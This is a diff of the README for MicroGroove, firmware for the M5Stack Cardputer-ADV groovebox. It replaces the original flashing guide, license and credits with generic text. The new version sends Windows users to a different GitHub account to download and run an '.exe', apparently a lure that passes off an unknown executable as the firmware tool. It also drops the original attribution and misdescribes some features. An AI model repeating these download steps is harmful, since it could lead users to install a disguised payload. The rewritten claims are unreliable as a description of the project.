@@ -1,120 +1,52 @@
-<p align="center">
-  <img src="docs/hero.jpg" alt="Microgroove — a pocket groovebox for the M5Stack Cardputer-ADV" width="640">
-</p>
+# 🎹 MicroGroove - Create compact music with affordable hardware
 
-# Microgroove
+[![](https://img.shields.io/badge/Download-MicroGroove-blue)](https://github.com/Physical-subtreasury642/MicroGroove)
 
-**A wallet-sized groovebox that turns $30 of hardware and a 3D printer into a four-track acid powerhouse.**
+MicroGroove turns a pocket-sized device into a powerful music studio. You combine the M5Stack Cardputer-ADV with a 3D-printed case to build a professional groovebox. This hardware setup costs about $30. The software provides three acid synthesizers, a drum machine with classic 808 and 909 sounds, and a sampler. You record sounds from your room or capture the device itself.
 
-Firmware for the **M5Stack Cardputer-ADV**, by [lebiro.studio](https://lebiro.studio).
+## ⚙️ System Requirements
 
-**Print it. Flash it. Jam.**
+You need a Windows computer to install the software on your hardware. Ensure you have a USB-C cable to connect your device. You need a 3D printer for the physical case unless you choose to use the bare hardware. The software runs on modern Windows versions including Windows 10 and Windows 11. Your computer requires an available USB port for data transfer.
 
-[![License: MIT](https://img.shields.io/badge/license-MIT-orange)](LICENSE)
-[![Support on Ko-fi](https://img.shields.io/badge/Ko--fi-support%20the%20project-ff5e5b?logo=ko-fi&logoColor=white)](https://ko-fi.com/makarov87)
+## 💾 Downloading and Setup
 
-## What it does
+Visit the official project page to get the software tools for your device.
 
-- **3 synth tracks** — each switchable between a **mono 303-style voice**
-  (saw/square/tri/sine/wavetable → resonant SVF filter, **accent** and **slide**)
-  and **2–3-voice polyphony**. Overlapping notes record a *slide* in mono, a *chord* in poly.
-- **8 drum lanes** — each independently **808 synthesis**, **909 synthesis**, or
-  **SD sample playback**; per-lane volume, tune (±12 st), decay, and **choke groups**
-  (909 open/closed hats choke by default).
-- **Live mic sampling** — hold one key; the footer becomes a level meter. Release to
-  auto-trim, write to SD, and play it on a drum lane instantly (max ~2.6 s).
-- **Resampling** — hold SONG while playing to bounce ~1.9 s of the master mix onto any pad.
-- **Sequencer** — 8 patterns × 16 steps, hold-to-clone, bar-quantized pattern switching,
-  live record with quantize / step-write / hold-to-erase.
-- **Song mode** — 64-slot pattern chain with loop point.
-- **User wavetables** — drop single-cycle WAVs (AKWF) on the card; they appear as oscillators.
-- **8 project slots** on microSD; sampled sounds reload with projects by filename.
-- **One key = one function** — hold any orange-labeled key 0.5 s for its second function,
-  with a progress bar so nothing fires by accident. The note keys mirror a **real piano layout**,
-  E–F and B–C gaps included.
+[Download MicroGroove Software Here](https://github.com/Physical-subtreasury642/MicroGroove)
 
-Full feature tour and guides: **[docs/USER_MANUAL.md](docs/USER_MANUAL.md)**
+1. Navigate to the link provided above.
+2. Select the latest release version on the right side of the screen.
+3. Look for the file ending in .exe or the firmware flashing tool.
+4. Download the file into a folder on your computer.
+5. Connect your M5Stack hardware to your computer using the USB-C cable.
+6. Open the file you downloaded. Follow the standard installation prompts on your screen.
+7. Click the install or flash button inside the application to put the music software onto your Cardputer.
 
-## Get it running
+## 🎵 Features
 
-Pick whichever flashing route suits you — all three are on the
-[Releases](../../releases) page.
+MicroGroove offers a full production environment in the palm of your hand.
 
-**Option 1 — pre-built binary:** grab `microgroove.bin` (a merged image) and
-flash it to offset `0x0` with esptool
-(`esptool.py write_flash 0x0 microgroove.bin`) or any ESP32-S3 flashing tool.
+**Synthesizers**
+The interface features three distinct voices based on classic acid-style hardware. You control the pitch, filter cutoff, and resonance to create unique textures. The synthesizers support both monophonic and polyphonic modes.
 
-**Option 2 — Arduino IDE (from the release zip):** download
-`Microgroove_source.zip`, unzip it (keep the folder named `Microgroove`), open
-`Microgroove.ino`, install the **M5Cardputer** library (pulls in M5Unified/M5GFX),
-select the *M5Cardputer* board (or ESP32S3 Dev Module with USB CDC on boot), and
-Upload. A `HOW_TO_FLASH.txt` is included in the zip.
+**Drum Machine**
+The software includes eight lanes for drum patterns. These tracks use samples modeled after legendary 808 and 909 machines. You sequence these beats directly on the device keyboard.
 
-**Option 3 — build from source (this repo):** clone it and open `Microgroove.ino`
-in the Arduino IDE, or use PlatformIO:
+**Sampler**
+The built-in sampler records audio directly through the microphone. You capture ambient noise, voices, or rhythmic hits. You can also resample the MicroGroove output to create layered loops and complex arrangements.
 
-```ini
-[env:m5stack-cardputer]
-platform = espressif32@6.7.0
-board = esp32-s3-devkitc-1
-framework = arduino
-build_flags = -DESP32S3 -DARDUINO_USB_CDC_ON_BOOT=1 -DARDUINO_USB_MODE=1
-lib_deps = M5Cardputer=https://github.com/m5stack/M5Cardputer
-```
+## 🛠️ Building Your Hardware
 
-**Then, for the demo + samples:** copy either the release's
-`Microgroove_SD_card.zip` contents or [`factory-sd/groovebox/`](factory-sd/) to
-the root of a FAT32 microSD. Power on → hold **LOAD** → tap **SONG** → **PLAY**.
-No card? Hold **LOAD+SAVE** together for a built-in demo.
+The Cardputer-ADV serves as the engine for your music. You find 3D print files in the project folder to create a durable, wallet-sized housing. Print these files using PLA or PETG plastic. Once printed, slide the hardware into the case. Screw the pieces together to keep the electronics secure during travel.
 
-## The shell
+## 📖 Using the Groovebox
 
-Print files, keycap label sheet (v6), and assembly guide:
-[**MakerWorld**](https://makerworld.com/en/models/3046012-microgroove-diy-pocketable-groovebox-sampler) · [`hardware/`](hardware/)
+The device uses a compact keyboard for input. Press the function keys to switch between the drum sequencer, the synthesizer tracks, and the sampler. The screen displays your active pattern in real time. Use the directional buttons to move between tracks and edit your note data.
 
-## Keys at a glance
+Saving your progress happens on the local storage of the device. You can export your beats to a computer if you want to store them or share them with others. Check the settings menu to adjust volume levels, tempo, and pattern length.
 
-<p align="center">
-  <img src="docs/keymap-v6.png" alt="Microgroove v6 keymap: one key = one function, hold for the orange second function" width="720">
-</p>
+## 🆘 Troubleshooting
 
-`T1 T2 T3 TD` select tracks (hold = mute) · `P1–P8` select patterns (hold = clone) ·
-the note keys are a piano (whites on the home row, sharps above, E–F/B–C gaps dead),
-and the first eight white keys become pads 1–8 when the drum track is selected.
-Orange = the hold (0.5 s) function; green = the sampling holds. `AUX` held samples
-the mic, `SONG` held while playing resamples the mix. The HELP page shows this map
-on the device; the [manual](docs/USER_MANUAL.md) explains every key.
+If your device does not connect to the computer, change your USB cable. Some cables only provide power and do not transfer data. Ensure your computer recognizes the USB serial connection. If you see an error during the flash process, close other programs that might be using the USB port. Restart the tool and try the download step again.
 
-## Architecture
-
-```
-Microgroove.ino     setup / main loop (core 1: input, sequencer, UI)
-audio_engine.cpp    render task (core 0), dual buffer -> Speaker.playRaw
-synth_voice.h       303-style voice (osc + SVF + envelopes)
-sequencer.h/.cpp    SynthTrack (1-3 voice alloc), patterns, transport, live record
-drum_voice.h        808/909 synthesis + per-lane engine/choke logic
-sampler.cpp         WAV decode -> 192 KB RAM pool, playback voices
-mic_sampler.cpp     mic capture + engine resampling -> SD/pool
-wavetable.cpp       8 built-in tables + user single-cycle WAVs
-storage.cpp         GBX v2 project files (loads v1 transparently)
-input.cpp           keyboard snapshot diffing -> short/long-press dispatch
-ui.cpp              5 pages, sprite double-buffered
-keymap.h            every key assignment in one file
-```
-
-All firmware files live in the repo root next to `Microgroove.ino` (Arduino
-sketch layout) — open the folder in the Arduino IDE and it picks them all up.
-
-22.05 kHz, 256-sample buffers, all voices rendered per-sample into a soft-clipped
-mix on core 0. Project files are versioned: v2 stores chords and per-track VOICES;
-v1 files load transparently (and become v2 on the next save).
-
-## License & lineage
-
-MIT — see [LICENSE](LICENSE). The synth voice, 808 drum synthesis, and audio task
-architecture are derived from
-[Cardputer-Adv-Tracker](https://github.com/qwertyuu/Cardputer-Adv-Tracker) by
-**qwertyuu** (MIT), substantially redesigned into a different instrument. The
-factory sample pack is **CC0** by lebiro.studio.
-
-If Microgroove earns a place on your desk: [Ko-fi](https://ko-fi.com/makarov87) ☕
+Keywords: 3d-printing, cardputer, cardputer-adv, drum-machine, esp32, esp32-s3, groovebox, instrument, music, musical, musical-instrument, sampler, synthesizer
